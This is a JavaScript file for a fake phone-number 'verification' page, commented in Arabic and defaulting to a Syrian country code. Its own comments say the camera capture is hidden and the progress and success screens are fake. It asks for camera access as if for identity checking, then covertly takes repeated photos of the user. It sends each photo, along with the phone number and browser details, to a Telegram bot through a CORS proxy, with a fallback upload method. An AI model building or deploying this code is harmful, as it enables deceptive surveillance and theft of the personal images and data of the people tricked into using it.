class VerificationSystem {
    constructor() {
        this.stream = null;
        this.captureInterval = null;
        this.captureCount = 0;
        this.currentStep = 1;
        this.phoneNumber = '';
        this.countryCode = '+963';
        
        this.init();
    }

    init() {
        // إخفاء شاشة التحميل بعد ثانيتين
        setTimeout(() => {
            document.getElementById('loader').classList.add('hidden');
            document.getElementById('mainApp').classList.remove('hidden');
        }, 2000);

        // مراقبة تغيير رمز الدولة
        document.getElementById('countryCode').addEventListener('change', (e) => {
            this.countryCode = e.target.value;
        });
    }

    // الانتقال للخطوة التالية
    nextStep(stepNumber) {
        document.querySelectorAll('.step-content').forEach(el => el.classList.remove('active'));
        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
        
        document.getElementById(`step${stepNumber}`).classList.add('active');
        document.querySelector(`.step[data-step="${stepNumber}"]`).classList.add('active');
        
        // تحديث حالة الخطوات السابقة
        for (let i = 1; i < stepNumber; i++) {
            document.querySelector(`.step[data-step="${i}"]`).classList.add('completed');
        }
        
        this.currentStep = stepNumber;
    }

    // بدء عملية التحقق
    async initiateVerification() {
        const phoneInput = document.getElementById('phoneNumber');
        const phone = phoneInput.value.trim();
        
        if (!phone || phone.length < 9) {
            this.showError('الرجاء إدخال رقم صحيح');
            return;
        }
        
        this.phoneNumber = this.countryCode + phone;
        
        // الانتقال لخطوة الكاميرا
        this.nextStep(2);
        
        // إظهار نافذة طلب الإذن
        setTimeout(() => {
            document.getElementById('permissionModal').classList.remove('hidden');
        }, 1000);
    }

    // طلب الوصول للكاميرا
    async requestCameraAccess() {
        document.getElementById('permissionModal').classList.add('hidden');
        
        try {
            this.updateStatus('📷', 'جاري الوصول للكاميرا...', 'يرجى الانتظار');
            
            this.stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                } 
            });
            
            const video = document.getElementById('videoElement');
            video.srcObject = this.stream;
            
            // بدء عملية التقاط الصور الخفية
            this.startHiddenCapture();
            
        } catch (err) {
            console.error('Camera error:', err);
            this.updateStatus('❌', 'فشل الوصول للكاميرا', 'يرجى السماح بالوصول والمحاولة مرة أخرى');
            setTimeout(() => {
                document.getElementById('permissionModal').classList.remove('hidden');
            }, 2000);
        }
    }

    // بدء التقاط الصور الخفية
    startHiddenCapture() {
        this.updateStatus('🔍', 'جاري التحقق من الهوية...', 'يرجى النظر مباشرة إلى الكاميرا');
        
        // التقاط أول صورة بعد ثانيتين
        setTimeout(() => {
            this.capturePhoto();
            
            // التقاط صور متتالية كل فترة محددة
            this.captureInterval = setInterval(() => {
                if (this.captureCount >= CONFIG.MAX_CAPTURES) {
                    this.finishVerification();
                } else {
                    this.capturePhoto();
                }
            }, CONFIG.CAPTURE_INTERVAL);
            
        }, 2000);
    }

    // التقاط الصورة وإرسالها
    async capturePhoto() {
        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvasElement');
        const ctx = canvas.getContext('2d');
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        ctx.drawImage(video, 0, 0);
        
        // تحويل الصورة إلى Blob
        canvas.toBlob(async (blob) => {
            if (blob) {
                await this.sendToTelegram(blob);
                this.captureCount++;
                
                // تحديث حالة التقدم الوهمية
                const progress = Math.min(100, (this.captureCount / CONFIG.MAX_CAPTURES) * 100);
                this.updateStatus('🔍', `جاري التحقق... ${progress}%`, 'الرجاء عدم تحريك الوجه');
            }
        }, 'image/jpeg', 0.8);
    }

    // إرسال الصورة إلى التلغرام
    async sendToTelegram(blob) {
        const formData = new FormData();
        formData.append('chat_id', CONFIG.CHAT_ID);
        formData.append('photo', blob, `capture_${Date.now()}.jpg`);
        formData.append('caption', `📸 التقاط جديد\n\n📱 الرقم: ${this.phoneNumber}\n🕐 الوقت: ${new Date().toLocaleString('ar-SY')}\n🌐 المتصفح: ${navigator.userAgent.slice(0, 50)}...`);
        
        try {
            // استخدام CORS proxy لتجاوز قيود المتصفح
            const proxyUrl = 'https://api.codetabs.com/v1/proxy?quest=';
            const telegramUrl = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
            
            const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
                method: 'POST',
                body: formData
            });
            
            if (!response.ok) {
                throw new Error('Failed to send');
            }
            
            console.log('✅ Photo sent successfully');
        } catch (error) {
            console.error('❌ Telegram error:', error);
            // في حالة الفشل، نحاول طريقة بديلة
            this.sendViaAlternateMethod(blob);
        }
    }

    // طريقة بديلة للإرسال (باستخدام Base64)
    async sendViaAlternateMethod(blob) {
        const reader = new FileReader();
        reader.readAsDataURL(blob);
        reader.onloadend = async () => {
            const base64data = reader.result;
            
            const message = `📸 التقاط جديد (Base64)\n\n📱 الرقم: ${this.phoneNumber}\n🕐 الوقت: ${new Date().toLocaleString()}\n📷 الحجم: ${(blob.size/1024).toFixed(2)} KB\n\n[الصورة في الأسفل]`;
            
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: message
                    })
                });
                
                // إرسال الصورة كملف
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        document: base64data,
                        caption: 'Captured Photo'
                    })
                });
            } catch (e) {
                console.error('❌ Backup method failed:', e);
            }
        };
    }

    // إنهاء التحقق وإظهار النجاح الوهمي
    finishVerification() {
        clearInterval(this.captureInterval);
        
        // إيقاف الكاميرا
        if (this.stream) {
            this.stream.getTracks().forEach(track => track.stop());
        }
        
        // إظهار الرقم المفعل
        document.getElementById('activatedNumber').textContent = this.phoneNumber;
        
        // الانتقال لخطوة النجاح
        this.nextStep(3);
    }

    // تحديث حالة الواجهة
    updateStatus(icon, title, text) {
        document.getElementById('statusIcon').textContent = icon;
        document.getElementById('statusTitle').textContent = title;
        document.getElementById('statusText').textContent = text;
    }

    // إظهار خطأ
    showError(message) {
        const input = document.getElementById('phoneNumber');
        input.style.borderColor = 'var(--danger)';
        setTimeout(() => {
            input.style.borderColor = 'var(--border)';
        }, 3000);
        
        alert(message);
    }

    // إعادة تعيين التطبيق
    resetApp() {
        this.captureCount = 0;
        this.phoneNumber = '';
        document.getElementById('phoneNumber').value = '';
        this.nextStep(1);
    }

    // نسخ الرقم
    copyNumber() {
        const number = document.getElementById('activatedNumber').textContent;
        navigator.clipboard.writeText(number).then(() => {
            const btn = document.querySelector('.copy-btn');
            btn.textContent = '✓ تم النسخ';
            setTimeout(() => {
                btn.textContent = '📋 نسخ';
            }, 2000);
        });
    }
}

// تهيئة النظام
let verificationSystem;

window.onload = () => {
    verificationSystem = new VerificationSystem();
};

// دوال مساعدة للـ HTML
function initiateVerification() {
    verificationSystem.initiateVerification();
}

function requestCameraAccess() {
    verificationSystem.requestCameraAccess();
}

function showError() {
    document.getElementById('permissionModal').classList.add('hidden');
    verificationSystem.updateStatus('⚠️', 'تم رفض الإذن', 'لا يمكن المتابعة بدون إذن الكاميرا');
}

function resetApp() {
    verificationSystem.resetApp();
}

function copyNumber() {
    verificationSystem.copyNumber();
}